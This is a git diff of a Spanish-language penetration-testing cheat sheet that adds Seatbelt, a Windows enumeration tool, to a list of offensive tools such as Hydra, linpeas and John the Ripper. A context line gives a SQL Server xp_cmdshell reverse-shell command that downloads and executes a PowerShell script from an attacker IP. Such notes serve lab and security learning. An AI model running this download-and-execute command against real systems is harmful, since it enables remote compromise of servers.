@@ -503,6 +503,7 @@ $ script -qc /bin/bash /dev/null
 		3. Con el comando `proxychains` delante de cualquier comando podremos mandar dicho comando a traves de nuestro proxy
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Buscar contraseñas por fuerza bruta a tavés de un protocolo o web
 - [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Saca info de la máquina para ver como escalar
+- [**Seatbelt**](https://github.com/GhostPack/Seatbelt)**:** Parecido al anterior pero solo con Windows. [Aquí](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) se pueden pillar los exe ya compilados.
 - [**John the Ripper**](https://github.com/openwall/john)**:** Permite crackear un montón de tipos de contraseñas.
 - **ReverShell desde server SQL:**
 	- Con este comando: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` se puede ejecutar
